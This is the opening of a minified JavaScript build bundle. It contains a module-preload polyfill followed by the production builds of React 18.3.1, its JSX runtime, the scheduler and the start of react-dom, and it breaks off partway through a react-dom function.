var ju = e => {
    throw TypeError(e)
};
var Hi = (e, t, n) => t.has(e) || ju("Cannot " + n);
var E = (e, t, n) => (Hi(e, t, "read from private field"), n ? n.call(e) : t.get(e)),
    V = (e, t, n) => t.has(e) ? ju("Cannot add the same private member more than once") : t instanceof WeakSet ? t.add(e) : t.set(e, n),
    A = (e, t, n, r) => (Hi(e, t, "write to private field"), r ? r.call(e, n) : t.set(e, n), n),
    pe = (e, t, n) => (Hi(e, t, "access private method"), n);
var ao = (e, t, n, r) => ({
    set _(o) {
        A(e, t, o, n)
    },
    get _() {
        return E(e, t, r)
    }
});

function Gp(e, t) {
    for (var n = 0; n < t.length; n++) {
        const r = t[n];
        if (typeof r != "string" && !Array.isArray(r)) {
            for (const o in r)
                if (o !== "default" && !(o in e)) {
                    const i = Object.getOwnPropertyDescriptor(r, o);
                    i && Object.defineProperty(e, o, i.get ? i : {
                        enumerable: !0,
                        get: () => r[o]
                    })
                }
        }
    }
    return Object.freeze(Object.defineProperty(e, Symbol.toStringTag, {
        value: "Module"
    }))
}(function() {
    const t = document.createElement("link").relList;
    if (t && t.supports && t.supports("modulepreload")) return;
    for (const o of document.querySelectorAll('link[rel="modulepreload"]')) r(o);
    new MutationObserver(o => {
        for (const i of o)
            if (i.type === "childList")
                for (const s of i.addedNodes) s.tagName === "LINK" && s.rel === "modulepreload" && r(s)
    }).observe(document, {
        childList: !0,
        subtree: !0
    });

    function n(o) {
        const i = {};
        return o.integrity && (i.integrity = o.integrity), o.referrerPolicy && (i.referrerPolicy = o.referrerPolicy), o.crossOrigin === "use-credentials" ? i.credentials = "include" : o.crossOrigin === "anonymous" ? i.credentials = "omit" : i.credentials = "same-origin", i
    }

    function r(o) {
        if (o.ep) return;
        o.ep = !0;
        const i = n(o);
        fetch(o.href, i)
    }
})();

function vc(e) {
    return e && e.__esModule && Object.prototype.hasOwnProperty.call(e, "default") ? e.default : e
}
var gc = {
        exports: {}
    },
    Si = {},
    wc = {
        exports: {}
    },
    b = {};
/**
 * @license React
 * react.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */
var ro = Symbol.for("react.element"),
    qp = Symbol.for("react.portal"),
    Yp = Symbol.for("react.fragment"),
    Xp = Symbol.for("react.strict_mode"),
    Zp = Symbol.for("react.profiler"),
    Jp = Symbol.for("react.provider"),
    eh = Symbol.for("react.context"),
    th = Symbol.for("react.forward_ref"),
    nh = Symbol.for("react.suspense"),
    rh = Symbol.for("react.memo"),
    oh = Symbol.for("react.lazy"),
    Ou = Symbol.iterator;

function ih(e) {
    return e === null || typeof e != "object" ? null : (e = Ou && e[Ou] || e["@@iterator"], typeof e == "function" ? e : null)
}
var xc = {
        isMounted: function() {
            return !1
        },
        enqueueForceUpdate: function() {},
        enqueueReplaceState: function() {},
        enqueueSetState: function() {}
    },
    Sc = Object.assign,
    kc = {};

function lr(e, t, n) {
    this.props = e, this.context = t, this.refs = kc, this.updater = n || xc
}
lr.prototype.isReactComponent = {};
lr.prototype.setState = function(e, t) {
    if (typeof e != "object" && typeof e != "function" && e != null) throw Error("setState(...): takes an object of state variables to update or a function which returns an object of state variables.");
    this.updater.enqueueSetState(this, e, t, "setState")
};
lr.prototype.forceUpdate = function(e) {
    this.updater.enqueueForceUpdate(this, e, "forceUpdate")
};

function Ec() {}
Ec.prototype = lr.prototype;

function Pl(e, t, n) {
    this.props = e, this.context = t, this.refs = kc, this.updater = n || xc
}
var Nl = Pl.prototype = new Ec;
Nl.constructor = Pl;
Sc(Nl, lr.prototype);
Nl.isPureReactComponent = !0;
var Lu = Array.isArray,
    Cc = Object.prototype.hasOwnProperty,
    Tl = {
        current: null
    },
    Pc = {
        key: !0,
        ref: !0,
        __self: !0,
        __source: !0
    };

function Nc(e, t, n) {
    var r, o = {},
        i = null,
        s = null;
    if (t != null)
        for (r in t.ref !== void 0 && (s = t.ref), t.key !== void 0 && (i = "" + t.key), t) Cc.call(t, r) && !Pc.hasOwnProperty(r) && (o[r] = t[r]);
    var l = arguments.length - 2;
    if (l === 1) o.children = n;
    else if (1 < l) {
        for (var u = Array(l), a = 0; a < l; a++) u[a] = arguments[a + 2];
        o.children = u
    }
    if (e && e.defaultProps)
        for (r in l = e.defaultProps, l) o[r] === void 0 && (o[r] = l[r]);
    return {
        $$typeof: ro,
        type: e,
        key: i,
        ref: s,
        props: o,
        _owner: Tl.current
    }
}

function sh(e, t) {
    return {
        $$typeof: ro,
        type: e.type,
        key: t,
        ref: e.ref,
        props: e.props,
        _owner: e._owner
    }
}

function _l(e) {
    return typeof e == "object" && e !== null && e.$$typeof === ro
}

function lh(e) {
    var t = {
        "=": "=0",
        ":": "=2"
    };
    return "$" + e.replace(/[=:]/g, function(n) {
        return t[n]
    })
}
var Mu = /\/+/g;

function Ki(e, t) {
    return typeof e == "object" && e !== null && e.key != null ? lh("" + e.key) : t.toString(36)
}

function Lo(e, t, n, r, o) {
    var i = typeof e;
    (i === "undefined" || i === "boolean") && (e = null);
    var s = !1;
    if (e === null) s = !0;
    else switch (i) {
        case "string":
        case "number":
            s = !0;
            break;
        case "object":
            switch (e.$$typeof) {
                case ro:
                case qp:
                    s = !0
            }
    }
    if (s) return s = e, o = o(s), e = r === "" ? "." + Ki(s, 0) : r, Lu(o) ? (n = "", e != null && (n = e.replace(Mu, "$&/") + "/"), Lo(o, t, n, "", function(a) {
        return a
    })) : o != null && (_l(o) && (o = sh(o, n + (!o.key || s && s.key === o.key ? "" : ("" + o.key).replace(Mu, "$&/") + "/") + e)), t.push(o)), 1;
    if (s = 0, r = r === "" ? "." : r + ":", Lu(e))
        for (var l = 0; l < e.length; l++) {
            i = e[l];
            var u = r + Ki(i, l);
            s += Lo(i, t, n, u, o)
        } else if (u = ih(e), typeof u == "function")
            for (e = u.call(e), l = 0; !(i = e.next()).done;) i = i.value, u = r + Ki(i, l++), s += Lo(i, t, n, u, o);
        else if (i === "object") throw t = String(e), Error("Objects are not valid as a React child (found: " + (t === "[object Object]" ? "object with keys {" + Object.keys(e).join(", ") + "}" : t) + "). If you meant to render a collection of children, use an array instead.");
    return s
}

function co(e, t, n) {
    if (e == null) return e;
    var r = [],
        o = 0;
    return Lo(e, r, "", "", function(i) {
        return t.call(n, i, o++)
    }), r
}

function uh(e) {
    if (e._status === -1) {
        var t = e._result;
        t = t(), t.then(function(n) {
            (e._status === 0 || e._status === -1) && (e._status = 1, e._result = n)
        }, function(n) {
            (e._status === 0 || e._status === -1) && (e._status = 2, e._result = n)
        }), e._status === -1 && (e._status = 0, e._result = t)
    }
    if (e._status === 1) return e._result.default;
    throw e._result
}
var Ee = {
        current: null
    },
    Mo = {
        transition: null
    },
    ah = {
        ReactCurrentDispatcher: Ee,
        ReactCurrentBatchConfig: Mo,
        ReactCurrentOwner: Tl
    };

function Tc() {
    throw Error("act(...) is not supported in production builds of React.")
}
b.Children = {
    map: co,
    forEach: function(e, t, n) {
        co(e, function() {
            t.apply(this, arguments)
        }, n)
    },
    count: function(e) {
        var t = 0;
        return co(e, function() {
            t++
        }), t
    },
    toArray: function(e) {
        return co(e, function(t) {
            return t
        }) || []
    },
    only: function(e) {
        if (!_l(e)) throw Error("React.Children.only expected to receive a single React element child.");
        return e
    }
};
b.Component = lr;
b.Fragment = Yp;
b.Profiler = Zp;
b.PureComponent = Pl;
b.StrictMode = Xp;
b.Suspense = nh;
b.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED = ah;
b.act = Tc;
b.cloneElement = function(e, t, n) {
    if (e == null) throw Error("React.cloneElement(...): The argument must be a React element, but you passed " + e + ".");
    var r = Sc({}, e.props),
        o = e.key,
        i = e.ref,
        s = e._owner;
    if (t != null) {
        if (t.ref !== void 0 && (i = t.ref, s = Tl.current), t.key !== void 0 && (o = "" + t.key), e.type && e.type.defaultProps) var l = e.type.defaultProps;
        for (u in t) Cc.call(t, u) && !Pc.hasOwnProperty(u) && (r[u] = t[u] === void 0 && l !== void 0 ? l[u] : t[u])
    }
    var u = arguments.length - 2;
    if (u === 1) r.children = n;
    else if (1 < u) {
        l = Array(u);
        for (var a = 0; a < u; a++) l[a] = arguments[a + 2];
        r.children = l
    }
    return {
        $$typeof: ro,
        type: e.type,
        key: o,
        ref: i,
        props: r,
        _owner: s
    }
};
b.createContext = function(e) {
    return e = {
        $$typeof: eh,
        _currentValue: e,
        _currentValue2: e,
        _threadCount: 0,
        Provider: null,
        Consumer: null,
        _defaultValue: null,
        _globalName: null
    }, e.Provider = {
        $$typeof: Jp,
        _context: e
    }, e.Consumer = e
};
b.createElement = Nc;
b.createFactory = function(e) {
    var t = Nc.bind(null, e);
    return t.type = e, t
};
b.createRef = function() {
    return {
        current: null
    }
};
b.forwardRef = function(e) {
    return {
        $$typeof: th,
        render: e
    }
};
b.isValidElement = _l;
b.lazy = function(e) {
    return {
        $$typeof: oh,
        _payload: {
            _status: -1,
            _result: e
        },
        _init: uh
    }
};
b.memo = function(e, t) {
    return {
        $$typeof: rh,
        type: e,
        compare: t === void 0 ? null : t
    }
};
b.startTransition = function(e) {
    var t = Mo.transition;
    Mo.transition = {};
    try {
        e()
    } finally {
        Mo.transition = t
    }
};
b.unstable_act = Tc;
b.useCallback = function(e, t) {
    return Ee.current.useCallback(e, t)
};
b.useContext = function(e) {
    return Ee.current.useContext(e)
};
b.useDebugValue = function() {};
b.useDeferredValue = function(e) {
    return Ee.current.useDeferredValue(e)
};
b.useEffect = function(e, t) {
    return Ee.current.useEffect(e, t)
};
b.useId = function() {
    return Ee.current.useId()
};
b.useImperativeHandle = function(e, t, n) {
    return Ee.current.useImperativeHandle(e, t, n)
};
b.useInsertionEffect = function(e, t) {
    return Ee.current.useInsertionEffect(e, t)
};
b.useLayoutEffect = function(e, t) {
    return Ee.current.useLayoutEffect(e, t)
};
b.useMemo = function(e, t) {
    return Ee.current.useMemo(e, t)
};
b.useReducer = function(e, t, n) {
    return Ee.current.useReducer(e, t, n)
};
b.useRef = function(e) {
    return Ee.current.useRef(e)
};
b.useState = function(e) {
    return Ee.current.useState(e)
};
b.useSyncExternalStore = function(e, t, n) {
    return Ee.current.useSyncExternalStore(e, t, n)
};
b.useTransition = function() {
    return Ee.current.useTransition()
};
b.version = "18.3.1";
wc.exports = b;
var g = wc.exports;
const Ot = vc(g),
    ch = Gp({
        __proto__: null,
        default: Ot
    }, [g]);
/**
 * @license React
 * react-jsx-runtime.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */
var dh = g,
    fh = Symbol.for("react.element"),
    ph = Symbol.for("react.fragment"),
    hh = Object.prototype.hasOwnProperty,
    mh = dh.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED.ReactCurrentOwner,
    yh = {
        key: !0,
        ref: !0,
        __self: !0,
        __source: !0
    };

function _c(e, t, n) {
    var r, o = {},
        i = null,
        s = null;
    n !== void 0 && (i = "" + n), t.key !== void 0 && (i = "" + t.key), t.ref !== void 0 && (s = t.ref);
    for (r in t) hh.call(t, r) && !yh.hasOwnProperty(r) && (o[r] = t[r]);
    if (e && e.defaultProps)
        for (r in t = e.defaultProps, t) o[r] === void 0 && (o[r] = t[r]);
    return {
        $$typeof: fh,
        type: e,
        key: i,
        ref: s,
        props: o,
        _owner: mh.current
    }
}
Si.Fragment = ph;
Si.jsx = _c;
Si.jsxs = _c;
gc.exports = Si;
var y = gc.exports,
    Rc = {
        exports: {}
    },
    ze = {},
    jc = {
        exports: {}
    },
    Oc = {};
/**
 * @license React
 * scheduler.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */
(function(e) {
    function t(R, O) {
        var D = R.length;
        R.push(O);
        e: for (; 0 < D;) {
            var U = D - 1 >>> 1,
                J = R[U];
            if (0 < o(J, O)) R[U] = O, R[D] = J, D = U;
            else break e
        }
    }

    function n(R) {
        return R.length === 0 ? null : R[0]
    }

    function r(R) {
        if (R.length === 0) return null;
        var O = R[0],
            D = R.pop();
        if (D !== O) {
            R[0] = D;
            e: for (var U = 0, J = R.length, pt = J >>> 1; U < pt;) {
                var ot = 2 * (U + 1) - 1,
                    Qi = R[ot],
                    rn = ot + 1,
                    uo = R[rn];
                if (0 > o(Qi, D)) rn < J && 0 > o(uo, Qi) ? (R[U] = uo, R[rn] = D, U = rn) : (R[U] = Qi, R[ot] = D, U = ot);
                else if (rn < J && 0 > o(uo, D)) R[U] = uo, R[rn] = D, U = rn;
                else break e
            }
        }
        return O
    }

    function o(R, O) {
        var D = R.sortIndex - O.sortIndex;
        return D !== 0 ? D : R.id - O.id
    }
    if (typeof performance == "object" && typeof performance.now == "function") {
        var i = performance;
        e.unstable_now = function() {
            return i.now()
        }
    } else {
        var s = Date,
            l = s.now();
        e.unstable_now = function() {
            return s.now() - l
        }
    }
    var u = [],
        a = [],
        p = 1,
        m = null,
        h = 3,
        w = !1,
        k = !1,
        v = !1,
        S = typeof setTimeout == "function" ? setTimeout : null,
        d = typeof clearTimeout == "function" ? clearTimeout : null,
        c = typeof setImmediate < "u" ? setImmediate : null;
    typeof navigator < "u" && navigator.scheduling !== void 0 && navigator.scheduling.isInputPending !== void 0 && navigator.scheduling.isInputPending.bind(navigator.scheduling);

    function f(R) {
        for (var O = n(a); O !== null;) {
            if (O.callback === null) r(a);
            else if (O.startTime <= R) r(a), O.sortIndex = O.expirationTime, t(u, O);
            else break;
            O = n(a)
        }
    }

    function x(R) {
        if (v = !1, f(R), !k)
            if (n(u) !== null) k = !0, ae(C);
            else {
                var O = n(a);
                O !== null && Ue(x, O.startTime - R)
            }
    }

    function C(R, O) {
        k = !1, v && (v = !1, d(_), _ = -1), w = !0;
        var D = h;
        try {
            for (f(O), m = n(u); m !== null && (!(m.expirationTime > O) || R && !Z());) {
                var U = m.callback;
                if (typeof U == "function") {
                    m.callback = null, h = m.priorityLevel;
                    var J = U(m.expirationTime <= O);
                    O = e.unstable_now(), typeof J == "function" ? m.callback = J : m === n(u) && r(u), f(O)
                } else r(u);
                m = n(u)
            }
            if (m !== null) var pt = !0;
            else {
                var ot = n(a);
                ot !== null && Ue(x, ot.startTime - O), pt = !1
            }
            return pt
        } finally {
            m = null, h = D, w = !1
        }
    }
    var P = !1,
        N = null,
        _ = -1,
        M = 5,
        L = -1;

    function Z() {
        return !(e.unstable_now() - L < M)
    }

    function z() {
        if (N !== null) {
            var R = e.unstable_now();
            L = R;
            var O = !0;
            try {
                O = N(!0, R)
            } finally {
                O ? Oe() : (P = !1, N = null)
            }
        } else P = !1
    }
    var Oe;
    if (typeof c == "function") Oe = function() {
        c(z)
    };
    else if (typeof MessageChannel < "u") {
        var I = new MessageChannel,
            ue = I.port2;
        I.port1.onmessage = z, Oe = function() {
            ue.postMessage(null)
        }
    } else Oe = function() {
        S(z, 0)
    };

    function ae(R) {
        N = R, P || (P = !0, Oe())
    }

    function Ue(R, O) {
        _ = S(function() {
            R(e.unstable_now())
        }, O)
    }
    e.unstable_IdlePriority = 5, e.unstable_ImmediatePriority = 1, e.unstable_LowPriority = 4, e.unstable_NormalPriority = 3, e.unstable_Profiling = null, e.unstable_UserBlockingPriority = 2, e.unstable_cancelCallback = function(R) {
        R.callback = null
    }, e.unstable_continueExecution = function() {
        k || w || (k = !0, ae(C))
    }, e.unstable_forceFrameRate = function(R) {
        0 > R || 125 < R ? console.error("forceFrameRate takes a positive int between 0 and 125, forcing frame rates higher than 125 fps is not supported") : M = 0 < R ? Math.floor(1e3 / R) : 5
    }, e.unstable_getCurrentPriorityLevel = function() {
        return h
    }, e.unstable_getFirstCallbackNode = function() {
        return n(u)
    }, e.unstable_next = function(R) {
        switch (h) {
            case 1:
            case 2:
            case 3:
                var O = 3;
                break;
            default:
                O = h
        }
        var D = h;
        h = O;
        try {
            return R()
        } finally {
            h = D
        }
    }, e.unstable_pauseExecution = function() {}, e.unstable_requestPaint = function() {}, e.unstable_runWithPriority = function(R, O) {
        switch (R) {
            case 1:
            case 2:
            case 3:
            case 4:
            case 5:
                break;
            default:
                R = 3
        }
        var D = h;
        h = R;
        try {
            return O()
        } finally {
            h = D
        }
    }, e.unstable_scheduleCallback = function(R, O, D) {
        var U = e.unstable_now();
        switch (typeof D == "object" && D !== null ? (D = D.delay, D = typeof D == "number" && 0 < D ? U + D : U) : D = U, R) {
            case 1:
                var J = -1;
                break;
            case 2:
                J = 250;
                break;
            case 5:
                J = 1073741823;
                break;
            case 4:
                J = 1e4;
                break;
            default:
                J = 5e3
        }
        return J = D + J, R = {
            id: p++,
            callback: O,
            priorityLevel: R,
            startTime: D,
            expirationTime: J,
            sortIndex: -1
        }, D > U ? (R.sortIndex = D, t(a, R), n(u) === null && R === n(a) && (v ? (d(_), _ = -1) : v = !0, Ue(x, D - U))) : (R.sortIndex = J, t(u, R), k || w || (k = !0, ae(C))), R
    }, e.unstable_shouldYield = Z, e.unstable_wrapCallback = function(R) {
        var O = h;
        return function() {
            var D = h;
            h = O;
            try {
                return R.apply(this, arguments)
            } finally {
                h = D
            }
        }
    }
})(Oc);
jc.exports = Oc;
var vh = jc.exports;
/**
 * @license React
 * react-dom.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */
var gh = g,
    Ae = vh;

function T(e) {
    for (var t = "https://reactjs.org/docs/error-decoder.html?invariant=" + e, n = 1; n < arguments.length; n++) t += "&args[]=" + encodeURIComponent(arguments[n]);
    return "Minified React error #" + e + "; visit " + t + " for the full message or use the non-minified dev environment for full errors and additional helpful warnings."
}
var Lc = new Set,
    Dr = {};

function kn(e, t) {
    Jn(e, t), Jn(e + "Capture", t)
}

function Jn(e, t) {
    for (Dr[e] = t, e = 0; e < t.length; e++) Lc.add(t[e])
}
var St = !(typeof window > "u" || typeof window.document > "u" || typeof window.document.createElement > "u"),
    Ns = Object.prototype.hasOwnProperty,
    wh = /^[:A-Z_a-z\u00C0-\u00D6\u00D8-\u00F6\u00F8-\u02FF\u0370-\u037D\u037F-\u1FFF\u200C-\u200D\u2070-\u218F\u2C00-\u2FEF\u3001-\uD7FF\uF900-\uFDCF\uFDF0-\uFFFD][:A-Z_a-z\u00C0-\u00D6\u00D8-\u00F6\u00F8-\u02FF\u0370-\u037D\u037F-\u1FFF\u200C-\u200D\u2070-\u218F\u2C00-\u2FEF\u3001-\uD7FF\uF900-\uFDCF\uFDF0-\uFFFD\-.0-9\u00B7\u0300-\u036F\u203F-\u2040]*$/,
    Iu = {},
    Du = {};

function xh(e) {
    return Ns.call(Du, e) ? !0 : Ns.call(Iu, e) ? !1 : wh.test(e) ? Du[e] = !0 : (Iu[e] = !0, !1)
}

function Sh(e, t, n, r) {
    if (n !== null && n.type === 0) return !1;
    switch (typeof t) {
        case "function":
        case "symbol":
            return !0;
        case "boolean":
            return r ? !1 : n !== null ? !n.acceptsBooleans : (e = e.toLowerCase().slice(0, 5), e !== "data-" && e !== "aria-");
        default:
            return !1
    }
}

function kh(e, t, n, r) {
    if (t === null || typeof t > "u" || Sh(e, t, n, r)) return !0;
    if (r) return !1;
    if (n !== null) switch (n.type) {
        case 3:
            return !t;
        case 4:
            return t === !1;
        case 5:
            return isNaN(t);
        case 6:
            return isNaN(t) || 1 > t
    }
    return !1
}

function Ce(e, t, n, r, o, i, s) {
    this.acceptsBooleans = t === 2 || t === 3 || t === 4, this.attributeName = r, this.attributeNamespace = o, this.mustUseProperty = n, this.propertyName = e, this.type = t, this.sanitizeURL = i, this.removeEmptyString = s
}
var fe = {};
"children dangerouslySetInnerHTML defaultValue defaultChecked innerHTML suppressContentEditableWarning suppressHydrationWarning style".split(" ").forEach(function(e) {
    fe[e] = new Ce(e, 0, !1, e, null, !1, !1)
});
[
    ["acceptCharset", "accept-charset"],
    ["className", "class"],
    ["htmlFor", "for"],
    ["httpEquiv", "http-equiv"]
].forEach(function(e) {
    var t = e[0];
    fe[t] = new Ce(t, 1, !1, e[1], null, !1, !1)
});
["contentEditable", "draggable", "spellCheck", "value"].forEach(function(e) {
    fe[e] = new Ce(e, 2, !1, e.toLowerCase(), null, !1, !1)
});
["autoReverse", "externalResourcesRequired", "focusable", "preserveAlpha"].forEach(function(e) {
    fe[e] = new Ce(e, 2, !1, e, null, !1, !1)
});
"allowFullScreen async autoFocus autoPlay controls default defer disabled disablePictureInPicture disableRemotePlayback formNoValidate hidden loop noModule noValidate open playsInline readOnly required reversed scoped seamless itemScope".split(" ").forEach(function(e) {
    fe[e] = new Ce(e, 3, !1, e.toLowerCase(), null, !1, !1)
});
["checked", "multiple", "muted", "selected"].forEach(function(e) {
    fe[e] = new Ce(e, 3, !0, e, null, !1, !1)
});
["capture", "download"].forEach(function(e) {
    fe[e] = new Ce(e, 4, !1, e, null, !1, !1)
});
["cols", "rows", "size", "span"].forEach(function(e) {
    fe[e] = new Ce(e, 6, !1, e, null, !1, !1)
});
["rowSpan", "start"].forEach(function(e) {
    fe[e] = new Ce(e, 5, !1, e.toLowerCase(), null, !1, !1)
});
var Rl = /[\-:]([a-z])/g;

function jl(e) {
    return e[1].toUpperCase()
}
"accent-height alignment-baseline arabic-form baseline-shift cap-height clip-path clip-rule color-interpolation color-interpolation-filters color-profile color-rendering dominant-baseline enable-background fill-opacity fill-rule flood-color flood-opacity font-family font-size font-size-adjust font-stretch font-style font-variant font-weight glyph-name glyph-orientation-horizontal glyph-orientation-vertical horiz-adv-x horiz-origin-x image-rendering letter-spacing lighting-color marker-end marker-mid marker-start overline-position overline-thickness paint-order panose-1 pointer-events rendering-intent shape-rendering stop-color stop-opacity strikethrough-position strikethrough-thickness stroke-dasharray stroke-dashoffset stroke-linecap stroke-linejoin stroke-miterlimit stroke-opacity stroke-width text-anchor text-decoration text-rendering underline-position underline-thickness unicode-bidi unicode-range units-per-em v-alphabetic v-hanging v-ideographic v-mathematical vector-effect vert-adv-y vert-origin-x vert-origin-y word-spacing writing-mode xmlns:xlink x-height".split(" ").forEach(function(e) {
    var t = e.replace(Rl, jl);
    fe[t] = new Ce(t, 1, !1, e, null, !1, !1)
});
"xlink:actuate xlink:arcrole xlink:role xlink:show xlink:title xlink:type".split(" ").forEach(function(e) {
    var t = e.replace(Rl, jl);
    fe[t] = new Ce(t, 1, !1, e, "http://www.w3.org/1999/xlink", !1, !1)
});
["xml:base", "xml:lang", "xml:space"].forEach(function(e) {
    var t = e.replace(Rl, jl);
    fe[t] = new Ce(t, 1, !1, e, "http://www.w3.org/XML/1998/namespace", !1, !1)
});
["tabIndex", "crossOrigin"].forEach(function(e) {
    fe[e] = new Ce(e, 1, !1, e.toLowerCase(), null, !1, !1)
});
fe.xlinkHref = new Ce("xlinkHref", 1, !1, "xlink:href", "http://www.w3.org/1999/xlink", !0, !1);
["src", "href", "action", "formAction"].forEach(function(e) {
    fe[e] = new Ce(e, 1, !1, e.toLowerCase(), null, !0, !0)
});

function Ol(e, t, n, r) {
    var o = fe.hasOwnProperty(t) ? fe[t] : null;
    (o !== null ? o.type !== 0 : r || !(2 < t.length) || t[0] !== "o" && t[0] !== "O" || t[1] !== "n" && t[1] !== "N") && (kh(t, n, o, r) && (n = null), r || o === null ? xh(t) && (n === null ? e.removeAttribute(t) : e.setAttribute(t, "" + n)) : o.mustUseProperty ? e[o.propertyName] = n === null ? o.type === 3 ? !1 : "" : n : (t = o.attributeName, r = o.attributeNamespace, n === null ? e.removeAttribute(t) : (o = o.type, n = o === 3 || o === 4 && n === !0 ? "" : "" + n, r ? e.setAttributeNS(r, t, n) : e.setAttribute(t, n))))
}
var Nt = gh.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED,
    fo = Symbol.for("react.element"),
    Pn = Symbol.for("react.portal"),
    Nn = Symbol.for("react.fragment"),
    Ll = Symbol.for("react.strict_mode"),
    Ts = Symbol.for("react.profiler"),
    Mc = Symbol.for("react.provider"),
    Ic = Symbol.for("react.context"),
    Ml = Symbol.for("react.forward_ref"),
    _s = Symbol.for("react.suspense"),
    Rs = Symbol.for("react.suspense_list"),
    Il = Symbol.for("react.memo"),
    Mt = Symbol.for("react.lazy"),
    Dc = Symbol.for("react.offscreen"),
    Fu = Symbol.iterator;

function dr(e) {
    return e === null || typeof e != "object" ? null : (e = Fu && e[Fu] || e["@@iterator"], typeof e == "function" ? e : null)
}
var X = Object.assign,
    Gi;

function Sr(e) {
    if (Gi === void 0) try {
        throw Error()
    } catch (n) {
        var t = n.stack.trim().match(/\n( *(at )?)/);
        Gi = t && t[1] || ""
    }
    return `
` + Gi + e
}
var qi = !1;

function Yi(e, t) {
    if (!e || qi) return "";
    qi = !0;
    var n = Error.prepareStackTrace;
    Error.prepareStackTrace = void 0;
    try {
        if (t)
            if (t = function() {
                    throw Error()
                }, Object.defineProperty(t.prototype, "props", {
                    set: function() {
                        throw Error()
                    }
                }), typeof Reflect == "object" && Reflect.construct) {
                try {
                    Reflect.construct(t, [])
                } catch (a) {
                    var r = a
                }
                Reflect.construct(e, [], t)
            } else {
                try {
                    t.call()
                } catch (a) {
                    r = a
                }
                e.call(t.prototype)
            }
        else {
            try {
                throw Error()
            } catch (a) {
                r = a
            }
            e()
        }
    } catch (a) {
        if (a && r && typeof a.stack == "string") {
            for (var o = a.stack.split(`
`), i = r.stack.split(`
`), s = o.length - 1, l = i.length - 1; 1 <= s && 0 <= l && o[s] !== i[l];) l--;
            for (; 1 <= s && 0 <= l; s--, l--)
                if (o[s] !== i[l]) {
                    if (s !== 1 || l !== 1)
                        do
                            if (s--, l--, 0 > l || o[s] !== i[l]) {
                                var u = `
` + o[s].replace(" at new ", " at ");
                                return e.displayName && u.includes("<anonymous>") && (u = u.replace("<anonymous>", e.displayName)), u
                            }
                    while (1 <= s && 0 <= l);
                    break
                }
        }
    } finally {
        qi = !1, Error.prepareStackTrace = n
    }
    return (e = e ? e.displayName || e.name : "") ? Sr(e) : ""
}

function Eh(e) {
    switch (e.tag) {
        case 5:
            return Sr(e.type);
        case 16:
            return Sr("Lazy");
        case 13:
            return Sr("Suspense");
        case 19:
            return Sr("SuspenseList");
        case 0:
        case 2:
        case 15:
            return e = Yi(e.type, !1), e;
        case 11:
            return e = Yi(e.type.render, !1), e;
        case 1:
            return e = Yi(e.type, !0), e;
        default:
            return ""
    }
}

function js(e) {
    if (e == null) return null;
    if (typeof e == "function") return e.displayName || e.name || null;
    if (typeof e == "string") return e;
    switch (e) {
        case Nn:
            return "Fragment";
        case Pn:
            return "Portal";
        case Ts:
            return "Profiler";
        case Ll:
            return "StrictMode";
        case _s:
            return "Suspense";
        case Rs:
            return "SuspenseList"
    }
    if (typeof e == "object") switch (e.$$typeof) {
        case Ic:
            return (e.displayName || "Context") + ".Consumer";
        case Mc:
            return (e._context.displayName || "Context") + ".Provider";
        case Ml:
            var t = e.render;
            return e = e.displayName, e || (e = t.displayName || t.name || "", e = e !== "" ? "ForwardRef(" + e + ")" : "ForwardRef"), e;
        case Il:
            return t = e.displayName || null, t !== null ? t : js(e.type) || "Memo";
        case Mt:
            t = e._payload, e = e._init;
            try {
                return js(e(t))
            } catch {}
    }
    return null
}

function Ch(e) {
    var t = e.type;
    switch (e.tag) {
        case 24:
            return "Cache";
        case 9:
            return (t.displayName || "Context") + ".Consumer";
        case 10:
            return (t._context.displayName || "Context") + ".Provider";
        case 18:
            return "DehydratedFragment";
        case 11:
            return e = t.render, e = e.displayName || e.name || "", t.displayName || (e !== "" ? "ForwardRef(" + e + ")" : "ForwardRef");
        case 7:
            return "Fragment";
        case 5:
            return t;
        case 4:
            return "Portal";
        case 3:
            return "Root";
        case 6:
            return "Text";
        case 16:
            return js(t);
        case 8:
            return t === Ll ? "StrictMode" : "Mode";
        case 22:
            return "Offscreen";
        case 12:
            return "Profiler";
        case 21:
            return "Scope";
        case 13:
            return "Suspense";
        case 19:
            return "SuspenseList";
        case 25:
            return "TracingMarker";
        case 1:
        case 0:
        case 17:
        case 2:
        case 14:
        case 15:
            if (typeof t == "function") return t.displayName || t.name || null;
            if (typeof t == "string") return t
    }
    return null
}

function Zt(e) {
    switch (typeof e) {
        case "boolean":
        case "number":
        case "string":
        case "undefined":
            return e;
        case "object":
            return e;
        default:
            return ""
    }
}

function Fc(e) {
    var t = e.type;
    return (e = e.nodeName) && e.toLowerCase() === "input" && (t === "checkbox" || t === "radio")
}

function Ph(e) {
    var t = Fc(e) ? "checked" : "value",
        n = Object.getOwnPropertyDescriptor(e.constructor.prototype, t),
        r = "" + e[t];
    if (!e.hasOwnProperty(t) && typeof n < "u" && typeof n.get == "function" && typeof n.set == "function") {
        var o = n.get,
            i = n.set;
        return Object.defineProperty(e, t, {
            configurable: !0,
            get: function() {
                return o.call(this)
            },
            set: function(s) {
                r = "" + s, i.call(this, s)
            }
        }), Object.defineProperty(e, t, {
            enumerable: n.enumerable
        }), {
            getValue: function() {
                return r
            },
            setValue: function(s) {
                r = "" + s
            },
            stopTracking: function() {
                e._valueTracker = null, delete e[t]
            }
        }
    }
}

function po(e) {
    e._valueTracker || (e._valueTracker = Ph(e))
}

function Ac(e) {
    if (!e) return !1;
    var t = e._valueTracker;
    if (!t) return !0;
    var n = t.getValue(),
        r = "";
    return e && (r = Fc(e) ? e.checked ? "true" : "false" : e.value), e = r, e !== n ? (t.setValue(e), !0) : !1
}

function Ho(e) {
    if (e = e || (typeof document < "u" ? document : void 0), typeof e > "u") return null;
    try {
        return e.activeElement || e.body
    } catch {
        return e.body
    }
}

function Os(e, t) {
    var n = t.checked;
    return X({}, t, {
